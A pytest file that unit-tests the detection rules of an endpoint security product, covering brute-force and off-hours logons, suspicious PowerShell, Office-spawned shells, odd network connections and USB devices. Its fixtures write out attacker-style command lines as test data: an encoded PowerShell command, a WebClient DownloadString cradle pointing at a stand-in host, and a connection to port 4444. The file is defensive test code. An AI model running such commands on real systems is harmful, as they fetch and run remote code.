"""Phase 3: rule unit harness — fixtures per rule (positive/negative/
boundary/missing-fields), run without HTTP."""
import uuid
from datetime import datetime, timedelta, timezone

import pytest

from app.core.timeutil import as_utc
from app.db.models import Detection, SecurityEvent
from app.services.detection import dispatch_event, effective_config
from app.services.rules import (
    BUILTIN_RULE_IDS,
    AbnormalLoginTimeRule,
    BruteForceRule,
    NewDeviceRule,
    NewUsbDeviceRule,
    OfficeShellChainRule,
    PrivilegedLogonRule,
    SuspiciousNetworkRule,
    SuspiciousPowerShellRule,
)


def _sec(db, org_id, endpoint_id, category, subtype, actor="alice",
         occurred=None, attributes=None):
    occurred = occurred or datetime.now(timezone.utc)
    sec = SecurityEvent(
        org_id=org_id, endpoint_id=endpoint_id, telemetry_ref=-1,
        event_id=str(uuid.uuid4()), category=category, subtype=subtype,
        severity_hint="info", occurred_at=occurred, actor=actor,
        attributes=attributes or {})
    # telemetry_ref UNIQUE would collide on -1; use a throwaway raw row.
    from app.db.models import TelemetryEvent
    raw = TelemetryEvent(org_id=org_id, endpoint_id=endpoint_id,
                         event_id=str(uuid.uuid4()), type="auth",
                         occurred_at=occurred, payload={}, event_hash="x")
    db.add(raw)
    db.flush()
    sec.telemetry_ref = raw.id
    db.add(sec)
    db.flush()
    return sec


@pytest.fixture()
def ctx(db, org_a):
    ep = org_a  # org + users; endpoint created on demand
    from app.db.models import Endpoint
    endpoint = Endpoint(org_id=ep["org"].id, agent_id="agent-rule-1",
                        name="WS-RULE", status="healthy")
    db.add(endpoint)
    db.flush()
    return {"org_id": ep["org"].id, "endpoint_id": endpoint.id}


def _failures(db, ctx, n, actor="alice", minutes_ago=0):
    base = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    secs = []
    for i in range(n):
        secs.append(_sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
                         "LOGON_FAILURE", actor=actor,
                         occurred=base - timedelta(seconds=i * 30)))
    db.commit()
    return secs


# ------------------------------------------------------------------ AUTH-01
def test_auth01_below_threshold_no_detection(db, ctx):
    secs = _failures(db, ctx, 4)
    rule = BruteForceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    assert rule.evaluate(secs[0], db, cfg) is None  # newest event, only 4 in window


def test_auth01_threshold_fires_with_evidence(db, ctx):
    secs = _failures(db, ctx, 5)
    rule = BruteForceRule()
    match = rule.evaluate(secs[0], db, cfg := effective_config(db, ctx["org_id"], rule))
    assert match is not None
    assert match.rule_id == "AUTH-01"
    assert "5 failed logons" in match.explanation
    assert "threshold 5" in match.explanation
    assert len(match.related_event_ids) == 4
    assert match.primary_event_id == secs[0].id
    assert 0.0 < match.confidence <= 1.0


def test_auth01_six_fires_and_suppresses_repeat(db, ctx):
    from app.db.models import Detection
    secs = _failures(db, ctx, 6)
    rule = BruteForceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    m1 = rule.evaluate(secs[0], db, cfg)
    assert m1 is not None
    n = dispatch_event(db, secs[0], extra_rules=[rule], include_builtin=False)
    db.commit()
    assert n == 1
    # 7th failure inside the same window: suppressed (same open story).
    extra = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
                 "LOGON_FAILURE", actor="alice")
    db.commit()
    assert rule.evaluate(extra, db, cfg) is None
    assert db.query(Detection).count() == 1
    # ...but once resolved, a new occurrence fires again (no permanent gag).
    det = db.query(Detection).first()
    det.status = "resolved"
    db.commit()
    extra2 = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
                  "LOGON_FAILURE", actor="alice")
    db.commit()
    assert rule.evaluate(extra2, db, cfg) is not None


def test_auth01_ignores_success_and_missing_actor(db, ctx):
    rule = BruteForceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    ok = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
              "LOGON_SUCCESS", actor="alice")
    db.commit()
    assert rule.evaluate(ok, db, cfg) is None


def test_auth01_custom_params(db, ctx):
    rule = BruteForceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    cfg.params = {"threshold": 2, "window_seconds": 600}
    secs = _failures(db, ctx, 2)
    assert rule.evaluate(secs[0], db, cfg) is not None


# ------------------------------------------------------------------ AUTH-02
def test_auth02_outside_hours_fires(db, ctx):
    from app.db.models import OrgPolicy
    pol = db.query(OrgPolicy).filter(
        OrgPolicy.org_id == ctx["org_id"]).first()
    roles = dict(pol.roles or {})
    roles["day_shift"] = {"allowed_hours": {"start": "08:00", "end": "20:00"},
                          "allowed_ip_ranges": ["0.0.0.0/0"],
                          "require_registered_device": False}
    pol.roles = dict(roles)
    db.commit()
    rule = AbnormalLoginTimeRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    night = datetime.now(timezone.utc).replace(hour=2, minute=0)
    sec = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
               "LOGON_SUCCESS", occurred=night)
    db.commit()
    match = rule.evaluate(sec, db, cfg)
    assert match is not None
    assert "08:00-20:00" in match.explanation
    assert match.severity == "medium"


def test_auth02_inside_hours_silent_and_no_policy_silent(db, ctx):
    rule = AbnormalLoginTimeRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
               "LOGON_SUCCESS")
    db.commit()
    assert rule.evaluate(sec, db, cfg) is None  # no policy -> never invent one


# ------------------------------------------------------------------- DEV-01
def test_dev01_first_auth_fires_then_quiet(db, ctx):
    rule = NewDeviceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    first = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
                 "LOGON_SUCCESS")
    db.commit()
    assert rule.evaluate(first, db, cfg) is not None
    second = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
                  "LOGON_SUCCESS")
    db.commit()
    assert rule.evaluate(second, db, cfg) is None


# ------------------------------------------------------------------ PROC-01
def _proc_event(db, ctx, processes):
    from app.db.models import TelemetryEvent
    raw = TelemetryEvent(org_id=ctx["org_id"], endpoint_id=ctx["endpoint_id"],
                         event_id=str(uuid.uuid4()), type="process",
                         occurred_at=datetime.now(timezone.utc),
                         payload={"kind": "snapshot", "processes": processes},
                         event_hash="x")
    db.add(raw)
    db.flush()
    sec = SecurityEvent(org_id=ctx["org_id"], endpoint_id=ctx["endpoint_id"],
                        telemetry_ref=raw.id, event_id=str(uuid.uuid4()),
                        category="PROCESS", subtype="PROCESS_SNAPSHOT",
                        occurred_at=datetime.now(timezone.utc),
                        attributes={"process_count": len(processes)})
    db.add(sec)
    db.flush()
    db.commit()
    return sec


def test_proc01_plain_powershell_silent(db, ctx):
    rule = SuspiciousPowerShellRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [{"pid": 10, "name": "powershell.exe",
                                 "cmdline": "powershell.exe -NoLogo"}])
    assert rule.evaluate(sec, db, cfg) is None
    # -NoProfile alone (npm/VS Code launchers) is NOT suspicious.
    sec2 = _proc_event(db, ctx, [{"pid": 14, "name": "powershell.exe",
                                  "cmdline": "powershell.exe -NoProfile -Command npm run dev"}])
    assert rule.evaluate(sec2, db, cfg) is None


def test_proc01_encoded_fires_with_indicator(db, ctx):
    rule = SuspiciousPowerShellRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    cmd = "powershell.exe -EncodedCommand aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACkAKQA="
    sec = _proc_event(db, ctx, [{"pid": 11, "name": "powershell.exe",
                                 "cmdline": cmd}])
    match = rule.evaluate(sec, db, cfg)
    assert match is not None
    assert "encodedcommand" in match.explanation
    assert match.metadata["pid"] == 11
    assert "T1059.001" in rule.mitre


def test_proc01_downloadstring_and_pwsh(db, ctx):
    rule = SuspiciousPowerShellRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [{"pid": 12, "name": "pwsh.exe",
                                 "cmdline": "pwsh -c (New-Object Net.WebClient).DownloadString('http://x')"}])
    assert rule.evaluate(sec, db, cfg) is not None


def test_proc01_non_powershell_ignored(db, ctx):
    rule = SuspiciousPowerShellRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [{"pid": 13, "name": "notepad.exe",
                                 "cmdline": "notepad.exe encodedcommand foo"}])
    assert rule.evaluate(sec, db, cfg) is None


# ------------------------------------------------------------------ PROC-02
def test_proc02_word_spawns_powershell(db, ctx):
    rule = OfficeShellChainRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [
        {"pid": 100, "ppid": 4, "name": "WINWORD.EXE", "cmdline": ""},
        {"pid": 101, "ppid": 100, "name": "powershell.exe",
         "cmdline": "powershell.exe -c whoami"}])
    match = rule.evaluate(sec, db, cfg)
    assert match is not None
    assert "WINWORD.EXE" in match.explanation and "powershell.exe" in match.explanation


def test_proc02_chrome_spawns_powershell_silent(db, ctx):
    rule = OfficeShellChainRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [
        {"pid": 200, "ppid": 4, "name": "chrome.exe", "cmdline": ""},
        {"pid": 201, "ppid": 200, "name": "powershell.exe", "cmdline": ""}])
    assert rule.evaluate(sec, db, cfg) is None


def test_proc02_orphan_shell_silent(db, ctx):
    rule = OfficeShellChainRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _proc_event(db, ctx, [{"pid": 300, "ppid": 9999,
                                 "name": "cmd.exe", "cmdline": ""}])
    assert rule.evaluate(sec, db, cfg) is None


# ------------------------------------------------------------------- NET-01
def _net_event(db, ctx, connections):
    from app.db.models import TelemetryEvent
    raw = TelemetryEvent(org_id=ctx["org_id"], endpoint_id=ctx["endpoint_id"],
                         event_id=str(uuid.uuid4()), type="network",
                         occurred_at=datetime.now(timezone.utc),
                         payload={"kind": "snapshot", "connections": connections},
                         event_hash="x")
    db.add(raw)
    db.flush()
    sec = SecurityEvent(org_id=ctx["org_id"], endpoint_id=ctx["endpoint_id"],
                        telemetry_ref=raw.id, event_id=str(uuid.uuid4()),
                        category="NETWORK", subtype="CONNECTION_ROLLUP",
                        occurred_at=datetime.now(timezone.utc), attributes={})
    db.add(sec)
    db.flush()
    db.commit()
    return sec


def test_net01_external_sensitive_port_fires(db, ctx):
    rule = SuspiciousNetworkRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _net_event(db, ctx, [
        {"remote": "10.0.0.5:443", "process": "chrome.exe"},
        {"remote": "8.8.8.8:4444", "process": "powershell.exe"}])
    match = rule.evaluate(sec, db, cfg)
    assert match is not None
    assert "8.8.8.8:4444" in match.explanation
    assert match.severity == "medium"


def test_net01_normal_traffic_silent(db, ctx):
    rule = SuspiciousNetworkRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _net_event(db, ctx, [
        {"remote": "10.0.0.5:443", "process": "chrome.exe"},
        {"remote": "93.184.216.34:443", "process": "chrome.exe"}])
    assert rule.evaluate(sec, db, cfg) is None  # external 443 is not suspicious


# ------------------------------------------------------------------- SYS-01
def test_sys01_privileged_logon_fires_service_snapshot_silent(db, ctx):
    rule = PrivilegedLogonRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    sec = _sec(db, ctx["org_id"], ctx["endpoint_id"], "AUTHENTICATION",
               "PRIVILEGED_LOGON", actor="admin")
    db.commit()
    match = rule.evaluate(sec, db, cfg)
    assert match is not None
    assert "4672" in match.explanation
    svc = _sec(db, ctx["org_id"], ctx["endpoint_id"], "SYSTEM",
               "SERVICE_SNAPSHOT")
    db.commit()
    assert rule.evaluate(svc, db, cfg) is None  # no baseline yet: honest skip


# ------------------------------------------------------------------- USB-01
def test_usb01_device_change_fires_snapshot_silent(db, ctx):
    rule = NewUsbDeviceRule()
    cfg = effective_config(db, ctx["org_id"], rule)
    seen = _sec(db, ctx["org_id"], ctx["endpoint_id"], "USB", "DEVICE_CHANGE",
                attributes={"device": {"device": "E:"}})
    db.commit()
    match = rule.evaluate(seen, db, cfg)
    assert match is not None
    assert match.severity == "low"
    assert "E:" in match.explanation
    snap = _sec(db, ctx["org_id"], ctx["endpoint_id"], "USB", "VOLUME_SNAPSHOT",
                attributes={"removable": []})
    db.commit()
    assert rule.evaluate(snap, db, cfg) is None


# ---------------------------------------------------------------- registry
def test_registry_has_eight_stable_ids():
    assert BUILTIN_RULE_IDS == ["AUTH-01", "AUTH-02", "DEV-01", "PROC-01",
                                "PROC-02", "NET-01", "SYS-01", "USB-01"]
    assert "TEST-MARKER" not in BUILTIN_RULE_IDS
